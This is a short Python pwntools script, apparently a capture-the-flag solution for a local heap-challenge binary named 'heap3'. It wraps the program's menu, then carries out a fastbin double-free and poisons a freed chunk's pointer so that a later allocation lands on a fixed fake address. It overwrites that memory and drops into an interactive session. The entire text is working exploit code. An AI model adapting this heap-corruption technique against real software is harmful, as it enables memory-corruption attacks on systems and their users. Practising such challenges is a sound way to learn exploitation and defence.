from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'split', '-h']

ru = lambda p, x        : p.recvuntil(x)
sn = lambda p, x        : p.send(x)
rl = lambda p           : p.recvline()
sl = lambda p, x        : p.sendline(x)
rv = lambda p, x=1024   : p.recv(numb = x)
sa = lambda p, a, b     : p.sendafter(a,b)
sla = lambda p, a, b    : p.sendlineafter(a,b)
rr = lambda p, t        : p.recvrepeat(t)
rd = lambda p, x        : p.recvuntil(x, drop=True)

# io = gdb.debug(['./heap2'], "b 43\nc")

io = process("./heap3")

def choice(p, idx):
    sla(p, "choice : ", str(idx))

def add(p, idx, size):
    choice(p, 1)
    sla(p, "idx plz : ", str(idx))
    sla(p, "size plz : ", str(size))

def rm(p, idx):
    choice(p, 2)
    sla(p, "idx plz : ", str(idx))

def show(p, idx):
    choice(p, 3)
    sla(p, "idx plz : ", str(idx))

def edit(p, idx, data):
    choice(p, 4)
    sla(p, "idx plz : ", str(idx))
    sa(p, "content plz : ", data)


add(io, 0, 0x60)
add(io, 1, 0x60)
add(io, 2, 0x60)
rm(io, 0)
rm(io, 1)
rm(io, 0)

fake = 0x602238

add(io, 0, 0x60)
edit(io, 0, p64(fake))
add(io, 1, 0x60)
add(io, 3, 0x60)

add(io, 4, 0x60)

gdb.attach(io, "b 85")
edit(io, 4, p32(0xdeadbeef)*20)

choice(io, 5)

io.interactive()